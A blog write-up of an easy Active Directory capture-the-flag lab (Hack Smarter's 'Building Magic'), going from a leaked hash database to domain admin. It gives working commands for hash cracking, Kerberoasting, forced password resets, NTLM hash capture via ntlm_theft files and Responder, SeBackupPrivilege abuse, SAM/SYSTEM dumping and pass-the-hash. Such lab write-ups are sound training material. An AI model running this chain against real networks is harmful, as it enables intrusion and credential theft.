---
title: "Hack Smarter - AD Challenge Lab: Building Magic (Easy)"
date: 2025-11-25T00:00:00Z
draft: false
description: "Write-up for Hack Smarter's Building Magic Lab."
---

## Hack Smarter - AD Challenge Lab: Building Magic (Easy)

I have been meaning to check out the [Hack Smarter Labs](https://www.hacksmarter.org/) for some time now, the creator of the site [Tyler Ramsbey](https://www.youtube.com/@TylerRamsbey) provides great content and his YouTube and Discord encouraged me to get my OSCP. Today I bought his membership and did an easy lab for fun, the site is great and labs spin up in under a minute, I expected nothing less.

Jump to sections: [r.widdleton](#r-widdleton) · [r.haggard](#r-haggard) · [h.potch](#h-potch) · [h.grangon](#h-grangon) · [Administrator](#administrator)

## r.widdleton {#r-widdleton}
We begin the lab with the IP address, doamin name (buildingmagic.local), and a leaked database file.  Start by providing the hashes to hashcat to crack. 
`hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt`

{{< image src="/assets/buildingmagic/01_hash.png" alt="" width="1200" linked="false" class="center-image" >}} 
We next verify these creds using nxc.
`nxc smb 10.0.27.23 -u r.widdleton -p 'lilronron'`

{{< image src="/assets/buildingmagic/02_valid_creds.png" alt="" width="1200" linked="false" class="center-image" >}} 
Great we have our initial user, now we need to do some enumeration to find how to pivot or escalate to another user. Running BH will help us gain some info about user permissions and might be helpful later down the road.
`bloodhound-ce-python -d BUILDINGMAGIC.LOCAL -u 'r.widdleton' -p 'lilronron' -ns 10.0.27.23 -c all`

{{< image src="/assets/buildingmagic/03_bh_python.png" alt="" width="1200" linked="false" class="center-image" >}} 
Note: I have found that the new BH Docker takes forever to clear the database if you initiate the data removal through the gui - this command is much faster `docker volume rm $(docker volume ls -q | grep neo4j-data)`

We can check r.widdleton in BloodHound and see they are not have any interesting groups or outbound object control. Next I like running an LDAPDomainDump to gain information about computers, users, and groups to get a good idea of the whole AD environment. It looks like the theme of this box is Harry Potter, the box name now makes more sense.
`ldapdomaindump ldap://10.0.27.23 -u 'BUILDINGMAGIC.LOCAL\r.widdleton' -p 'lilronron'`

{{< image src="/assets/buildingmagic/04_dump_users.png" alt="" width="1200" linked="false" class="center-image" >}} 
We see that r.haggard has a SPN set which most likely means we need to Kerberoast.

## r.haggard {#r-haggard}
We can run a Kerberoasting attack to try to identify and crack r.haggard's hash since this user has a SPN set.
`sudo impacket-GetUserSPNs buildingmagic.local/r.widdleton:lilronron -dc-ip 10.0.27.23 -request -outputfile kerberoast_hashes.txt`

{{< image src="/assets/buildingmagic/05_kerberoast.png" alt="" width="1200" linked="false" class="center-image" >}} 
After we crack the hash we can verify the creds using nxc.

{{< image src="/assets/buildingmagic/06_haggard_nxc.png" alt="" width="1200" linked="false" class="center-image" >}} 
We can take a look at r.haggard outbound object control in BH to find they can ForceChangePassword over h.potch

{{< image src="/assets/buildingmagic/07_haggard_bh.png" alt="" width="1200" linked="false" class="center-image" >}} 

## h.potch {#h-potch}
BloodHound provides instructions on how to force a password change, we can force the change and verify the change took place with nxc, we can also check shares to see we have read,write access over File-Share.
`net rpc password 'h.potch' 'P@$$w0rd!' -U 'BUILDINGMAGIC.LOCAL'/'r.haggard'%'rubeushagrid' -S '10.0.27.23'`

`nxc smb 10.0.27.23 -u h.potch -p 'P@$$w0rd!'`

{{< image src="/assets/buildingmagic/08_potch_nxc.png" alt="" width="1200" linked="false" class="center-image" >}} 

We connect to the SMB share but there is nothing inside of it, since we have write access I think this is a good time to use [ntlm_theft](https://github.com/Greenwolf/ntlm_theft). We can generate all files using the following command.
`python3 ntlm_theft.py --generate all --server 10.200.21.72 --filename payroll`

Using the files we generated we want to start a Responder listener, upload the ntlm_theft files, and hope we capture a ntlm credential via the user interacting with the ntlm_theft file we upload to the SMB share. Let's start the responder listener and uploading the files.
`sudo responder -I tun0 `

`impacket-smbclient 'h.potch':'P@$$w0rd!'@DC01.BUILDINGMAGIC.LOCAL `

It looks like the .lnk file was the one that resulted in a captured hash for h.grangon.

{{< image src="/assets/buildingmagic/09_responder.png" alt="" width="1200" linked="false" class="center-image" >}} 

## h.grangon {#h-grangon}
Now that we have h.grangon's hash we can try to crack it and verify it is valid with nxc.
`hashcat -m 5600 h.grangon_hash.txt /usr/share/wordlists/rockyou.txt`

`nxc rdp 10.0.27.23 -u h.grangon -p 'magic4ever'`

{{< image src="/assets/buildingmagic/10_grangon_nxc.png" alt="" width="1200" linked="false" class="center-image" >}} 

We can look at any groups or outbound object control that h.grangon has and we find they are in the remote management users group which often means they can authenticate via RDP or winrm.

{{< image src="/assets/buildingmagic/11_grangon_bh.png" alt="" width="1200" linked="false" class="center-image" >}} 

Let's try to connect to the DC via evil-winrm.

`evil-winrm -i 10.0.27.23 -u H.GRANGON -p 'magic4ever'`

{{< image src="/assets/buildingmagic/12_user.png" alt="" width="1200" linked="false" class="center-image" >}} 

Great now we have the user flag! One of the first things I do when enumerating a machine is check current user creds, we can see that we have the SeBackupPrivilege role which can be exploited, see [https://r00tven0m.github.io/posts/Domain-Privilege-Escalation-Backup-Operators-Group/](https://r00tven0m.github.io/posts/Domain-Privilege-Escalation-Backup-Operators-Group/)

`whoami /all`

{{< image src="/assets/buildingmagic/13_privs.png" alt="" width="1200" linked="false" class="center-image" >}} 

If we want since SeBackup allows us to backup files we wouldn't normally be able to read, we can just read the root flag. We can import these two .dll files which give us helpful cmdlets for backing up files - [SeBackupPrivilegeCmdLets](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug). Using evil-winrm is as easy as using the upload command and uploading the .dll files.

`upload SeBackupPrivilegeUtils.dll`

`upload SeBackupPrivilegeCmdLets.dll`

`Import-Module .\SeBackupPrivilegeUtils.dll`

`Import-Module .\SeBackupPrivilegeCmdLets.dll`

`Set-SeBackupPrivilege`

`Copy-FileSeBackupPrivilege 'C:\Users\administrator\desktop\root.txt' .\root.txt`

{{< image src="/assets/buildingmagic/14_root.png" alt="" width="1200" linked="false" class="center-image" >}} 

Obviously this is not realistic, AD pentests do not involve just getting root so let's become domain admin.

## Administrator {#administrator}

Using the article linked above it shows we can easily save SAM & SYSTEM then secretsdump them locally. Let's give it a shot.

`reg save hklm\sam .\sam`

`reg save hklm\system .\system`

{{< image src="/assets/buildingmagic/15_sam_system.png" alt="" width="1200" linked="false" class="center-image" >}} 

Download the files to your local machine and we can run secretsdump.

{{< image src="/assets/buildingmagic/16_secretsdump.png" alt="" width="1200" linked="false" class="center-image" >}} 

We can then try to crack the hash with no luck, we also try to login as administrator a couple of different ways with no luck. Let's try for password reuse.

`nxc smb 10.0.27.23 -u users.txt -H 520126a03f5d5a8d836f1c4f34ede7ce`

{{< image src="/assets/buildingmagic/17_flatch.png" alt="" width="1200" linked="false" class="center-image" >}} 

Sweet we can see that the domain admin n.flatch reused the same cred on the local administrator account and their domain account. We now have DA and are done!